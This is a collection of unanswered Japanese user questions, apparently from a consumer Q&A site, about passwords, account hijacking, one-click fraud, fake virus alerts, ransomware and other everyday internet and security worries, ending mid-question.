バッファローリンクステーションのネットワークを開いたら、写真のようなパスワードを要求されました。 レノボのパスワードのようなのですが、パスワードを設定した覚えがありません。 どうすれば良いか教えてください。よろしくお願いします。
私の家のこのＰＣは３年くらい使っていて、 半年位前にWindows10に更新しましたが、 10に更新する前から ・地域の天気に投票できない ・Ｙａｈｏｏ！番組表が見れない また１番困っているのが使い始めてから数か月後から ・ネットで振り込みや申し込みをする際に入力途中で 再度ログイン（ログオン）してください というような表示が何度も出て、中々完了まで辿り着けません。 時間もかかるし、非常にイライラします。 何の設定が原因なんでしょうか。 いろいろと不都合で、非常に困っています。 ご存知の方解決方法を教えて下さい。
Twitterについて質問です！Twitterで不正ログインをされました…。ログイン履歴を見ると、わたしのものではないIPがありました。なお、いまだ不正ログインをされたのみで、実害は全くありません。 ここで質問です。このIPの持ち主(不正ログイン者)を警察以外の機関、たとえば民間の警備会社等に依頼して探し出してもらうことは可能なのでしょうか？とても困っています。ご回答よろしくお願いします！
スマホでサイトを見ていたところ、突然画面が切り替わって画像のような、いかにもGoogleから提供された感じの警告文が現れ、不定期にしつこく表示されるようになりました。初めは悪質なアドウェアだと思いウインドウを閉じるなどして無視を続けてきたのですが、この画面が現れる数日前本当にそっち系のサイトを閲覧してしまったうえに、文中で機種まで特定し、今までのアドウェアにないしつこさを見せるこの画面に少し不安を覚えるようになってきました。 この警告文の提供元がGoogleではないとしたら、個人情報流失、遠隔操作などされている可能性はありますでしょうか？また、この画面の表示を止めることはできますでしょうか？ 何卒お願いいたします。 ちなみにこの画面のどこをタップしてもGoogle Playのセキュリティアプリのインストール画面に飛ばされます。アプリの評価を見ると☆4.3とあり、ダウンロード数も1000万を超えているのですが、もちろんサクラですよね^_^;
SSHの認証方式に「公開鍵認証方式」と「パスワード認証方式」がありますが、 SSLのようにPKIを使った証明書認証がないのは理由があるのでしょうか。鍵配布時に中間者攻撃が成立するように思えてしまいます。
タナカsaaガスガンアーティラリーカートリッジレスタイプが欲しいです。 ネットで買おうと思ったのですがどこも在庫切れ で買えません。何処なら買えますか？
どうしても購入したいです！ 業務用クリスピーオニオン1kgをネット購入したいのですが、サイトを探してます！
分かる方よろしくお願いします。 当方、iPhone3GからずっとiPhoneを使用していて現在iPhone6sです。 つい最近までソフトバンクユーザーの専用WiFi(0002softbank)に繋がっていたのですが急に0002softbankに繋がらなくなり、0002softbankに繋ごうとするとID、パスワードを求められるようになりました。 仕事の半分以上0002softbankを使用していたので使えなくなると凄く困ります。 またネットにて調べてみましたが解決策が全然ありません。 あまり詳しくは無いので詳しく教えて下さる方是非よろしくお願いします。
出来れば至急教えて頂きたいのですが、グーグルＷＥＢマスターツールの件なのですが 検索アナリスクでのことなのですがクリエなどの分析が停止したままなのですが８月２５日から動きが無く停止したまま分析されていないみたいなのですが？ 考えれる理由は御座いますか。詳しくないのでチンプンカンプンで何がなんだか 分らないのですが、お詳しい方が折られましたら解決策をお教えいただけないでしょうか。 大変申し訳有りません宜しくお願い致します。
両親がマックを購入しwi-fi環境で使うことになりました。 オススメのセキュリティソフトを教えてください。 有線では使う予定はなく、wi-fiになります。 私も詳しくなく。。教えて頂けると助かります！
Googleアカウントを乗っ取られて、相手に自分の端末が削除されたら、Google設定は開けなくなるんでしょうか
PCに関する質問です。 最近DELLのInspiron15 5000シリーズを買いました。手探りでセットアップし何とかネットがみられるようになりました。以前はVISTAだったので変わりように戸惑っております。 さて、本題の質問をさせていただきます。 PCをシャットダウンし、その後立ち上げた際にサインインを求められますが、それがセットアップした際に決めたパスワードではなく、「前回最後に入力したパスワードを入れてください」となります。これはどのようにしたら、普通のパスワードを入れられるようになりますか？それとも今はこれがスタンダードなのでしょうか。（パスワードが必要なサイトなども利用するとそれを翌日まで覚えてなくてはいけないなんて...。記憶力に自信が...） 何卒ご教授よろしくお願いいたします。 自宅でしか使わないので、パスワードなしでホーム画面に行くのが一番ありがたいんですが…。 ※これはネットで調べて（「netplwiz」を使ってやる方法）設定してみましたが逆にパスワードのサインBOXが2つ現れて断念しました。何か良い方法がほかにもあれば合わせて教えていただけるとさらにうれしいです。
高校の教室にこんなものがあるんですが防犯カメラですか？調べたところ空間センサーって奴ぽいんですが鮮明に映りますか？
これって ＰＣ遠隔操作（ウィルス？） 本日ヤフオク中、ポインターがこちらの意に反して勝手に動き出しました。 意思を持ったかのように色々な所をクリックしたり怖いです。 突然電源を切りました。 その後、ヤフーに繋ぎましたがその後は今のところありません ウィンドーズ7 ノート型 会社の備品です ウィンドーズのセキュリティーを使用しています。 セキュリティーをかけましたが問題なし との事 ① ヤフオク ログイン中だったため ＩＤ や パスワード は大丈夫でしょうか？ （個人情報も含めて） ② 会社の備品でログインしてこうなりましたが、自宅のＰＣでログインしても同じ様な事になりますか？ ② セキュリティーで問題なし と出ましたがこのまま使用しても大丈夫でしょうか？ チェックするならどの様にすればよろしいでしょうか（本当に遠隔か見極めなど） 困っております助けてください
コクヨの丸筒紙管を買いたくて、ロフトや東急ハンズ、文房具屋、ホームセンターなどに行ってみたのですが、どこにも売っていません。 どこに売っているか分かる方、教えてください。最終手段として、ネットで買うことも考えていますが、できればお店で買いたいです。 https://www.kokuyo-st.co.jp/search/1_detail.php?seihin_sikibetu=1&s...
最近、aguse gatewayがこんな感じなのですが 何があったのでしょうか？ 教えて下さい。
サイバー犯罪についてです。サイバー犯罪の専門家に、サイバー犯罪について質問をする機会があります。 ・専門家が質問されて喜んで回答してくれるような質問。・こんなことを聞いてくるとは鋭いと思われるような質問。 ・専門家こ困らせるような意地悪な質問(サイバー犯罪についてです)。 上記3種類の質問のアイデアをください、大学～社会人レベルでお願いします。
インターネットで「盗聴」なんか出来るのですか？
カラパイアというサイトを閲覧しようと思いMicrosoft EdgeからＢingで「カラパイア」と検索するとトップに出てくるリンクから当該サイトへアクセスしました。「熱がこもった車内に犬が閉じ込められていた！通りがかりの男性が大きな石で窓をカチ割り犬を救出。」という記事に興味を惹かれたので「続きを読む」ボタンをクリックしたところ、記事とは無関係で全く見覚えのないアダルトサイトが表示されました。何度か元記事へアクセスを試みたところ見たかった記事が表示されるようになり、以後、アダルトサイトが表示されることはありませんでした。自分なりに調べてみたところ、Ｂingで「カラパイア」と検索してトップに表示されるリンクはどこかのプロクシサーバーを介してのアクセスになるようです。これが原因でしょうか？
OSがXP等の古いパソコン等（セキュリティーソフトは勿論入れます）を、ネツトに繋いだ場合 どのような弊害がありますか？パスワードや自分の大事な情報を入れなければ大丈夫と言う訳ではなく、ＩＰアドレスとか解り悪用されたりするものなどでしょうか？ どういった不具合が出ますでしょうか？ ＰＣをネットに繋いだ場合の不具合を詳しい方教えて下さい。 宜しくお願い致します。
Modbusのコイルって何ですか？ネットを見ていてもコイルがわかっている前提の話しかでてきませんし、 実際にどのような場面で使用するのかがイマイチわかりません。 コイルの読み出しを行うことで何ができますか？
ＰＳ３はポケットＷｉ-Ｆｉでも ネットに接続できますか？
WinZipのシリアルナンバー
わかるかた教えてください浮気を疑われ彼氏に携帯を取られ、 指紋と、6桁のロックをかけてる状態でiPhoneを奪い取られたのですが 2日後 ロックは、解除された上、中身が何カ月も前の状態で 帰ってきました ロックナンバーは、絶対にわかるものでは ありません 携帯の名義は、私本人です それから、1カ月が経ちますが 今日、Apple Storeで購入しようとしたところ ご利用のアカウントが新しいコンピュータ またはデバイスからアクセスされているため、ご購入の前にお支払い情報の確認が必要になります と出てきて、クレジットカード設定されてます もう、それ以来別れてるので 今でも携帯の中を何かパソコンなどで 見られているのであれば 非常に気持ち悪いので、 詳しい方教えてください どのような方法で中を見たのが考えられますでしょうか？？ また、今でも中を見られている可能性は ありますか？？
ネットワークカメラで音声入力が外部からできるもので比較的安価なものはありませんか?
ノ－トパソコン・・右下に「名刺大」の・・Microsoft名で、修理を促す画面がピコピコ表記されるんですがクリックすると危険ですか？
今日からですが Webからのメッセージ として「Hello new user」というものが新しいサイトへ行くごとに出てきます。消しても消しても出てくるので困っています。何が原因なのか見当がつかないのと煩わしいので無くすことが出来ないか？出さないようにする方法を教えてください。（Win8 IE10）
ネットとかに接続しにくくて、おかしいなと思っていたら、いつの間にかWi-Fiが変わっていました。父はこのことを言ってくれません...というか、今まで同じことがあっても言われたことはありません。今までは勝手にパスワードとか見て繋いでましたけど、これって大丈夫ですよね？バレたりするんですかね？バレたくないわけじゃないんですけど、なんか気になってしまって... 知識が全くないので、、、
久しぶりに"GORE動画"というサイトを閲覧しようと思ったのですが、パスワードが設けられており、管理人が設定したそのパスワードをクリアしないと閲覧ができないような仕組みになっておりました。ネットでも調べてみたのですが、一向にパスワードらしきものはヒットしませんでした。。 どなたか、ご存知の方いらっしゃいますでしょうか？ よろしくお願いします。
bylkh@hotmail.comからのメールって何？ このメルアドからメール来ている人いますか？迷惑メールで開かずに削除していますが、気になるので質問しました。 これは何の誘いでしょうか？
韓国人てなんでITに強いのですか？ハッキング強国としても知られていますよね。
会社の人のメールが受信できてしまいます。ふと、試しに会社で使用している自分のメールアドレスを、 他の人のメールアドレスに置き換えて入力してみたところ、 その人のメールが自分のところでも受信できてしまいました。 これはセキュリティ上まずいですよね？ 私が受信してしまったことはその人に分かってしまいますか？ ふと試しにしてしまったこととはいえ、罪悪感でいっぱいです。 ・セキュリティ上まずいかどうか ・私が受信してしまったことがその人や会社に分かってしまうか この２点について教えてください。
職場のPCに、one drive へのアクセスショートカットを残してままで、異動をしてしまいました。 次にそのPCを使用する人に間違ってログインさせない方法はないでしょうか？職場のPCはアクセスをさせない方法 を教えてください。 パスワードを変更させても、ショートカットを残しているPCだと、そのままログインが出来ると聞いたことが ありますので、大変心配しております。 アクセスさせない方法など、具体的に教えていただければと思います。 最悪、アカウントを削除する方法も考えておりますが、なるだけ残したく思います。 どうぞよろしくお願いします。
遊戯王のADSって今、ダウンロードできないのですか？Wikiで探しても出てこないのですが・・・ もしできるならURLを教えてください！！
助けて下さい削除したtwitterの情報が検索結果に出てきます。本名で登録して使っていたTwitterを１ヶ月程前に削除したのですが、 一か月経てば消えるだろうと思っていた検索結果で Twitterの情報が出てきてしまいます。 どのように対処したらよいか調べても全然出てきません・・。 ﾂｲｰﾄ内容までもが説明文の欄として出てきてしまうのですが、 それを消そうにも、 一か月経ってしまったのでｱｶｳﾝﾄを復元することは不可能です。 どうしたらよいでしょうか。困っています。よろしくお願いします。
iPod touchが強制初期化できません。弟がiPod touchをいじりまくって あと24370878分後にやり直してください と表示されるようになりました 僕自身は パスワードをわかっているので、243〜〜分後まで待とうと思ったのですが、 よく見てみると この時間は iPod touchを起動している時にしか経過していない事が判明して つまり 24370878分間 iPod touchを起動させ続けなければならない ので これはまずい と思い 強制初期化に至ったわけです しかし、ネットに書いてある通り、 再起動→ ホームボタンを押し その後に電源ボタンを押す→ iTunes StoreのマークとUSBマークが出てくる→PCと接続 の ホームボタンと電源ボタン の部分が 何回やってもただの 再起動 になってしまいます やり方が間違っているのでしょうか
会社でデュアルディスプレイを使いたいと思っています。 そこでいくつかお伺いしたいことがあります。 ・Think padタブレットとwigigドックを使ってタブレットをノートパソコンのサブディスプレイにすることはできますか？ ・(上記が可能だとした場合)会社ではセキュリティの問題から専用のパソコンしか使えませんが、タブレットをモニターとして接続した場合、会社のパソコンがウイルス等の脅威に晒される可能性はありますか？ 条件Ａタブレットは職場でのサブディスプレイ及び外部では文章作成などオフラインでしか使わない場合。 条件Ｂタブレットを家などのWi-Fiでインターネットに接続している場合。 以上が主な質問です。 調べてみるとノートパソコンやタブレットはHDMI出力しかないみたいなのですが、ハードウェアの利用のみでデュアルディスプレイはできないかと考えております。
とても不安です。アダルトサイトを見ていたら勝手に会員登録されてしまいました。 焦って退会メールを送ってしまい すこし時間がたち返信が返ってきて 「退会処理が出来ませんでした。 お電話にて、誤作動の内容を詳しくお伝えください。ご連絡がない場合は退会申請自体を間違いとの判断させていただき通常通りご請求させていただきます。」 ときました。 1度メールを送ってしまったので 請求や個人情報など大丈夫だと思いますか？ 助けてください！
iPhoneって鍵無しWi-Fiに繋いだら高確率でハッキングされますよね？この前喫茶店で鍵無しWi-Fiにうっかり繋がっていたのですがiPhoneでの鍵無しWi-Fiの利用は遠隔操作やハッキングの絶好のカモと聞きました。いくらIOSでも最新ver9.2.2でもWi-Fiの電波を介して入ってきてパスコード解除してくるので、IOSセキュリティの意味なくないですか？ ネットで検索かけると恐怖！鍵無しWi-Fiはハッキングされる！だの煽り記事ばかりでした。
大学の授業で、未来のコンピュータとネットワークについて想像するのですが、そもそも現代のことが分かりません。現代の、PCのメモリ容量（GB）とCPU速度（MIPS）と二次記憶容量（TB）と、ネットワーク（bps）を教えてください。 参考にしたいので、よろしくお願いします。
Googleへのログインで、最近使用した端末には自分の機種しかないのですが、使用した時間が明らかに違います。誰かが不正にログインしているんでしょうか
ISMSの監査について質問があります。 当方にてクラウドにWebサーバ(Linux)を構築しました。 Webサーバは会社のHPであり、個人情報を蓄積しないように構築しております。今後ISMSの監査対象となるのですが、具体的にISMS監査に向けてどのような 情報を記録や取得していけばよろしいでしょうか。 今監査のために一か月分の下記ログを取得し残しておこうと考えております。 ①システムログ ②ログインログ ③Webサーバアクセスログ ④サーバ内ファイル変更ログ(aide使用) ⑤メール送受信ログ 基本的には/var/logに出力されるものをほとんど取得しています。 ISMSのサーバ監査に関する分かりやすい情報をお持ちでしたらご教示下さい。
Wi-Fiデザリングとは何ですか？ AQUOSKユーザーなのですが、ネットの通信速度が遅いとき、キーボード面の右下のデザリングボタンを長押しするといつも繋がるので便利なのですが、Wi-Fiデザリングとは一体なんなのですか？
英語のある単語を使った用法・熟語をたくさん調べたくて（例えばmouseなど）、現地（海外）の新聞やネットの長い文章を探しています。その単語の語法をネット検索しても、翻訳サイトか１文のみの用法しか出てきません。 どこか、現地の用法・語法を調べるのに適したサイト、もしくは調べ方は有りますでしょうか？
高校や県教委のデータに自由に侵入した１７歳の少年は、 将来は天才ハッカーですか？？
たまに、 ヤフー知恵袋で不具合がありますが なぜ起きるのでしょうか？
TrueCryptはもうバージョンアップしないのでしょうか。一応ここ( https://truecrypt.ch/downloads/ )で、まだダウンロードはできますが、赤字でcurrently unmaintained と警告されています。 本家がダウンロードできなくなった騒動から、相当たちましたが、7.1aで最後なのでしょうか。 そうなると、セキュリティ的にはまだ使っても大丈夫ですか？
水飲み場型攻撃の水飲み場の名前の由来は何ですか？
セキュリティ技術者とハッカーって、何が違うんですか？
Yahoo!メールやサイトの閲覧で住所はバレますか？接続が悪いときに連打したため、誤作動でアダルトサイトに行ってしまって、動画を押してしまったらしく、登録ありがとうございますみたいなのが出ちゃいました。 そのときに何もしなければいいのを、私は削除の申請みたいなメールをYahoo!メールで送ってしまいました。それで、電話しないとできないみたいに来たのでしたくないから無視したし、毎回見たときは営業時間外なので電話しませんでした。そのまま放置していたら「ご連絡がいただけないので本登録とさせていただきます。ご登録ありがとうございます。当番組のアダルトコンテンツのパンフレットを送らせていただきます。」って来ました。 放置しても大丈夫ですか？住所バレてないですよね？
個人のＰＣもハッカー攻撃を受けるもの なのでしょうか？
タスクトレイからのネットワークの詳細にあるIPアドレスと違うIPがYahoo!のログイン履歴では表示されますどうしてなのでしょうか？
ワンクリック詐欺に合いましたアダルトサイトの動画を見ようしたら シャッター音がして5万ちょっとの請求 が来て、無視すればいいと思い 履歴を消して知恵袋見てたら 急にgoogleまでいってしまう ということが続き、今冷や汗がやバイです 最新のワンクリック詐欺は スマホ乗っ取りとか出来てしまうのですか？ 早めの返信をお願いします。
[ウイルスでしょうか] 一ヶ月ほど前から、パソコンがウイルスに感染したような感じになっています。tempフォルダに、わけのわからない名前のexeファイルがパソコンの起動とともにできていて、 起動数分後にAVG(セキュリティソフト)が駆除を行っています。 それだけでなく、パソコンを使用しているとふいにtempファイルに保存されているらしく、 時折AVGが感知して削除しています。 問題のtemp不フォルダのパスは以下です。 C:\programdata\microsoft\performance\monitor\temp このtempフォルダに、定期的に見知らぬexeファイルが生成されています･･･。 さっきパソコンを起動したときには、 [kochi (also known as･･･dumpling.exe]とかいう意味不明なファイルがありました。 どなたか解決方法をご教示ください。 お願いいたします。
先日、病院(総合病院)に行き、自宅に帰ってスマホ(iPhone)を開いたところ、写真内にその病院で撮影されたと思われる、知らない人のレントゲン写真が勝手に保存されていました。 Bluetoothなどは使っていません。 電波等でスマホに知らない間に画像を保存させたりできるのでしょうか？ ちなみにですが、レントゲン写真の欄外みたいなところに、氏名や年齢まで載ってました…
富士通の下請け業者の作ったサイトでバグを見つけました。 個人情報（住所名前番号など）抜き取れます。 会社に教えても良いんですが、せっかくなんでお金せしめたいなぁと考えています。（正当に） 方法があれば誰か教えてください。
ネットで検索したワードについて、関連する迷惑メールが届きます。 「就職」について検索すると、数日後から 今まで来た事のなかった「就活サイトを装った迷惑メール」が何通か来るようになりました。偶然かと思いましたが、その後もピンポイントでそういうメールが来ます。 例えばですが「カレー屋のバイト」を検索した後で「カレー屋で働きませんか」という内容など。 ちなみにグーグルで検索しています。 検索連動型広告の、迷惑メールバージョンってあるんでしょうか？
会員登録の際に入力した情報は、退会後削除されるのでしょうか？プライバシーの関係で詳しく説明する事は出来ませんが、会員登録を要するとあるサービスを利用する予定です。 一度しか使わないつもりなのでサービス利用後すぐ退会をするつもりなのですが、その際に氏名や住所などの情報は抹消されるのか、それともずっとサーバーに残るのかを教えて頂ければと思います。 詳しい事は分かりませんが WordPress というプラットフォームを利用しているようです。 web制作やネットのサーバー？については無知ですので、至らぬ所がありましたら申し訳ありません。 必ず利用しなければならない理由がありますので、利用しなければ良いのでは？等の質問から外れた回答は不必要です。ただただ、入力情報がどうなるか気になるだけなのですが、回答頂けますと嬉しいです。 宜しくお願い致します。 （この質問がどのジャンルに値するのか分からないのでカテ違いでしたらご指摘頂ければ幸いです。）
ネットで殺害予告や爆破予告をした場合、犯人の特定は容易なのですか？
おいらのケータイを破壊するプログラムを俺に送り付けてこれる奴って井川しかいないな！おいらのケータイを破壊するプログラムを俺に送り付けてこれる奴って井川しかいないな！
これって、フィッシング詐欺というやつでしょうか YahooやSafariを開けようとすると 『iosユーザーの皆様、当選おめでとうございます』という画像のような物が出てきてしまい、ネットを繋ぐことが出来なくなりました(>_<) どうしたら、表示されなくなるのでしょうか？ Safariの履歴、cookieを消したりしてみましたが改善されません。。 どなたか解答よろしくお願いしますm(__)m大変困ってます。。
現在、ラズベリーパイ３で家のwifiを利用して、teratermを使って設定などをいじっています。今度はVPN（softether）、かつwifiを使って外部のネットワークからラズベリーパイにつないでるカメラの映像を見たり、設定をいじったりしたいのですがなかなかうまくいきません。 どうすればいいか教えていただけないでしょうか。 以下設定です。（/etc/network/interfaces） auto lo iface lo inet loopback #wlan0 auto wlan0 allow-hotplug wlan0 iface wlan0 inet static address 192.168.0.4 netmask 255.255.255.0 gateway 192.168.0.1 wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf ~
スマホの使い方が分かりません(T_T) 初めてスマホ（Zenfone Go）を購入しました。 今までガラケーで、スマホには全くと言っていいほど触ったこともありません。ネットで注文したのですが、パッケージを開けてビックリ！ 説明書が、充電の仕方とSIMの入れ方位しか書いてない1枚の紙が入っているだけでした。 ネットで使用説明書が公開されているかと探してみたら、日本語版がありません。 （みつけられなかっただけかも...） 超初心者でも分かるような使用説明がされているサイト、もしくは日本語の使用説明書が公開されているサイトはないでしょうか？ ご存知の方がおられたら教えてください。m(__)m 電源の入れ方も分からず、どうしようかと途方にくれています。
当局へメールで通報した相手がまるで私のメールを読んだかのように証拠を隠滅して当局の調査を受けたようです。この相手はどうして私のメールが読めるのでしょうか？
フリーのファイルアクセスログ取得ソフトにつきまして 会社の各従業員の端末に「ファイルアクセスログ取得ソフト」の導入を検討しております。NAS(NetGearのReadyNAS316)上に格納された各フォルダ、ファイルのアクセスログ(どの端末がいつ読込・編集・削除をしたか)を取得可能なソフト(できればフリー)があれば教えていただきたく存じます。 LBアクセスログ2というソフトがありましたが、こちらは有料でした・・・。 FaccLog Ultimate Freeが良さそうでしたが、残念ながらネットワークドライブの情報は取れませんでした(T_T) Windows2012R2で別途サーバを構築しておりますので、NASを撤去して、 この2012R2をファイルサーバにし、FaccLogと組み合わせるというプランBはあります・・・ よろしくお願い致します。
どうすればアップデートできますか？ ネットには繋がっています。
LAN内マシンAをルータ側か別のLAN内マシンBから効率よく通信監視する方法はありますか？(数百～数千行のログだけ眺めるのは無理です...) というのも、父親(とても仲が悪く口も聞かず目も合わせない)が定年してからネットを覚え、今では毎日暇があればネットをしているようですが、知識もないのにエロサイト等を見て海外サイトの「あなたのPCが壊れています！」等のトラップにひかっかり、ウイルスやスパイウェアを入れては母親経由で修理依頼が私に来る日々です。 父親はとてもプライドが高く極度の内弁慶なので家族内に教えを請うたりする事を極端に嫌います。 なのでもしエロサイトの件等を指摘しよう物ならブチギレてPC破壊から光ケーブルの切断までやります。 そういう人なので穏便にコミュニケーションを取らずに解決する方法として通信監視をしたいのです。 何故監視なのかというとウイルス対策ソフト等では限界があり、騙されて自らインストールしてしまうタイプのトラップ系のスパイウェア等はウイルス検知されず、そのままPCに入ってしまいます。 なので何か良いツールや解決案、アドバイス等ありましたら是非ご教授頂けると助かります。
知らない人からアドレス変更のメールが来ました。何故ですか？情報漏洩してるんですか？
スマホ録画のshouについて。ネットに、一般→デイバス管理で、「信頼」というところを押せば、shouを使えると見たのですが、信頼を押すと、すべてのアクセス情報が、、、とか出るのですが、しないほうがいいですか？
ウィルス・セキュリティー・ソフトはDL版よりも製品版のほうが割高ですが、製品版を購入するメリットは何でしょうか???
UVライトをネットで買ったのですが、取り扱い説明書に「反射板のブルーのシートはのける」と書いてあり、剥がしました。ですが、剥がすとただのプラスチックのスライドトレーになってしまいました。このまま使っていいのでしょうか？それとも、あのブルーっぽいシートが実は反射板だったのでしょうか？ どうか、教えてください！！(＞_＜)
【全く関係ない人から嫌がらせみたいな 誤解回答がついたので 書き直ししました】 こんにちは 貴方でしたら詳しいことを知ってそうなので ご質問したいです こんな私ですが 最後までご協力いただけましたら 大変ありがたいです (私のこの質問と貴方の回答から できるだけたくさんの方が ハッキン グやクラッキングから しっかり身を守れますように！！！) 私は個人情報を守るために やるべきことはやっております (例えばメアドやパスワードは 20近く使いわけており 「個人の特徴」すら わからないよう また自分の部屋でさえ 「声に出して話さないよう」 盗聴器などが世には溢れてるので 大変分かりにくいもの にしてあります ①家族②親友③友達 ④知り合い ←これも5つメアド持ってます ⑤通販 ←これも 大型店・中型店・小型店 に分けてあります ⑥飲食店・旅館・クラブ・その他 ←これも 分けてあります ⑦銀行 ⑧クレジットカード会社 ←この二つのみは SIM+そのSIMの電話番号からじゃなければ 開けれなくなってます 他のメアドはスマホの電話番号を使っての設定は 一度もしていませんし 電話番号をメールの中で書いたこともありません ⑨警察 ⑩病院 ⑪ネット関連 ←これも使いわけてます) またスマホの あらゆる個人情報を開けるのは 法律に基づき 国の警察・検事のみで しかも 検事や裁判所が指示を出さなければ 彼らが私のスマホの実物を 持つことはできません だから 実物を持つとゆう上では 私のスマホの中身を持つのは 誰しも私のスマホの実物を持たない限り 不可能なのはわかっています (歩くときも端末情報を ハッキングやクラッキングができるような わけのわからぬ人間に盗まれぬよう 金網ケースに入れています) ですがそれでも スマホを使う上で 一つ心配な事があります それは ネットにもクラウドにもあげてない スマホ端末の中にある 「画像」です (私はPCには 一切保存したことがありません) ハッキングやクラッキングで それらで見る方法がありますか？ (アプリなどの 画像許可程度では 画像自体は見れないと聞きましたが 本当なのかどうかすらもわかりません) またもし見れるとしたら SNS企業・SNSアプリ関連企業に勤めてる人口の 何%でしょうか？
ヤフオク！をするようになってから Yahoo ID宛にウイルス付きメールが届くようになりました。 どうしたら良いでしょうか？ 今はただ迷惑メールで隔離、削除しています。
現在auiphone6plus64ギガを使っています。ギガ数が残りわずかになってしまって、新たにiPhone6splus１２８ギガに買い換えたいのですが、SIMカードはiPhone6plusではロック解除ができない？みたいですね。 格安SIMカード検討中でしたが、あまり、機械に詳しくないので、頭パンク状態です。 そこで、白ムロのiphone6splus１２８ギガを買ってから、mineo？でiPhone6plusを使ってSIMカードで安くしてから、新しくiPhone6splusに乗り換える事は可能でしょうか？ ごちゃごちゃの雑文ですいません。 携帯代もバカに高いです。 おもにネット、動画や写真をバカスカ使っています。
Web初心者です。 ログイン→A→B→Cと流れる画面でC画面表示時にお気に入り登録をする。 その後、ログイン→Aと来てA画面表示時にC画面へお気に入りから接続する。このA画面からC画面の遷移は通常遷移と異なる為、 遷移不可にする予定です。 これはセキュリティ対策になるのでしょうか？？ 教えて下さい。
ネットでsokudashiと言うサイトの動画再生ボタンを押したら登録完了となって49800円請求されました。これはワンクリック詐欺でしょうか?不安でしょうがないですその動画はvineのどうがです
先日、自宅のPC(windows xp)が、rsa4096 というランサムウェアにかかってしまい、ファイルが勝手に圧縮されてしまいました。( 拡張子 ： .crypt ) ウィルス自体は駆除出来たのですが、ファイルの解凍(復元？)ができません。どなたか、解凍の方法を教えてくれませんか？
ネットに住所を晒してしまったんですがもし誰かが家に来たらどうしましょう？ 誰かが家に嫌がらせに来たりすることは無いと思いますが もし被害にあったらどうすればいいのでしょう
youtube以外の動画サイトでしばらくするとウィルスが検出されたと出ました。03-4589-4659にかけたところ、日本人じゃないのが出ました。スマホからのテザリングでネットつないでるので通話中はネットつながらず、そういうと急に切られました。直後、強制終了から再起動してしらべると、それは詐欺だそうです。電話かけたけどそれだけでは大丈夫でしょうか。
関数アドレス保護違反の処置について教えてほしい Ox62dOcb49
LAN内のマシンで共有している動画ファイルを開くと不審なスクリプトエラーが出ます。エラー内容は以下のとおりです。※画像も参照※ ライン：0 文字：0 エラー：スクリプトエラー コード：0 URL：http://cdn.taboola.com/libtrc/impl.214-19-RELEASE.js LAN内のHDDにある動画ファイルを開くだけでなぜこのようなエラーが出るのか、なぜ外部サイトへのURLが表示されアクセスされるのかわかりません。動画を再生しているプレイヤーは GOMPlaye です。 ウイルスならば駆除したいですが、ウイルス検索しても引っかからないので困っています。対処法あれば教えてください。
ここ最近迷惑メールが大量に届いて困っています。それには少し心あたりがあって、漫画を読めるサイトの、コミックシーモアってありますよね？TVのCMでやっているのだからまず安全だと思ってました。私は会員登録しようとして、確認用のメールが届いたので、メールを開いてみるとほんとに確認用のメールなのかなと思うような、件名のやつだっので、もう一度登録しようとしたら、やはり会員登録の確認メールを送信を選んだ直後に来ていたので、しかたなく貼り付けられていたURLをタップしました。その先はよくわからないようなサイト？みたいなのにいき、やはり確認コードは無かったので、諦めました。それからというもの、１日に150通ぐらいのおかしな件名のメールが届くようになりました。それらは全て開かないようにし、ゴミ箱に捨てているのですが、それをやっている最中にもメールが届きます。内容は45億円がどーのこーのや、ATMで支払えとか口座反映済みだとかのいかにも嘘くさいメールが届きます。どうにかしようとして、調べてみると、コミックシーモア(公式)というのと、公式と書かれていないコミックシーモアというのがあることに気づきました。私は公式と書かれていない方のコミックシーモアで会員登録したからこのような事になってしまったのではないかと思います。もうどうしていいのかわかりません(･_･、)助けてください。
ランサムウエア対応について質問です。 ランサムウエアに感染したようで、ＰＣ立ち上げ時に英文のテキストファイルが 何枚も立ち上がります。※直訳すると 「あなたのデーターを書き変えました」と出ていました 。 とりあえずＰＣが、ネットで社内ＬＡＮに繋がっているので外しました。 が、困った事にセキュリティーソフトが全く反応が無かったのと現在 セキュリティーソフトが動きません。 ※セキュリティーソフトフォルダー内もデーター化けてしまっている状態です。 +REcovER+○○○○+（○○○○の中の単語は数種類あります） ネット外れてしまっているので別のウィルススキャンソフトもダウンロード 出来ません。 なので ＵＳＢメモリー経由で「Safety Scanner」か「Defender」を試そうと 思うのですが、 マイクロソフトからダウンロードした際のデーターは 最新のウイルス定義なのかが気になります。 どなたか試したことがある方はいらっしゃいますでしょうか？ ＯＳはウインドウズ７ プロフェッショナル ６４ビットＶｅｒで セキュリティーにウィルスバスターを入れていましたが、ピクリとも反応 しませんでした。 ウィルスバスターを信用していたので、「Defender」 「Security Essentials」は あまり覗きにもいかずに最新だったかも解りません。 以上、解りにくい質問ですが、お知恵をお貸しください。
iPhoneを拾ったとして悪用する方法ってありますか？ 最近外国人が多く出入りする店でiPhone6sを盗まれ、無いと気づいた瞬間に電話したのですが電源を切られており繋がらず、「iPhoneを探す」機能も使い物にならい常態でしたので直ぐに回線を停止しました。 6桁の暗証番号を打たなければ画面のロックを外す事を出来ないように設定をしてありますが、自分のiPhoneを悪用されるのが怖く、調べたところ、今のiPhoneは転売するのはほぼ不可能という事は分かりましたが、 他にiPhoneを悪用される可能性があるとすればどのような事なのでしょうか。
悩んでます。2ヶ月前に ワンクリック詐欺にひっかかったので、そのことについて疑問がいくつかあるので、教えていただきたいです。 私が面白いギャグサイトなどを見ていたら間違えてアダルトサイトに何回かいってしまい、動画もタップしてしまいました。(有料かはわかりません) そこで、再生ボタンも押してしまったので(再生されてるかと思い止めようとしたら再生ボタン押してしまいました) 映像は出ず、真っ暗でした。 そこで、端末の戻るボタンを何回か押したらあるサイトにいきました。(前のサイトか動画再生によるサイト誘導か？) そして、申し込みありがとうございます！(金額表示もされましたがどれくらいか覚えてません)そして、戻るボタンを押したら 電話 eメールと出たので 連絡すればマズいと思い表示されている閲覧履歴タブを消しました。 そこで質問です 1 動画再生による個人情報取得は可能ですか？(どこまで取得できるのか) 2 動画再生、またはサイトでどこかをタップしてしまったことでそうなった訳ですが、そうすることで、アプリインストールさせるのは可能ですか(表示されていませんが心配です) 3 自分のスマホはセキュリティがあり、アプリインストールしたら、不正なアプリかどうかということ、インストールされたことがわかります。もし、アプリインストールしていたら playストアのアプリのように表示されますか？また、不正なアプリだと判断されますか？判断されたら どうなりますか？ 4 (もし、アプリインストールしていた場合 表示されていた場合の回答) ホームには表示されていません。アプリインストールしたことはどこでわかりますか？アンインストールの方法はどうやるのですか？ 5 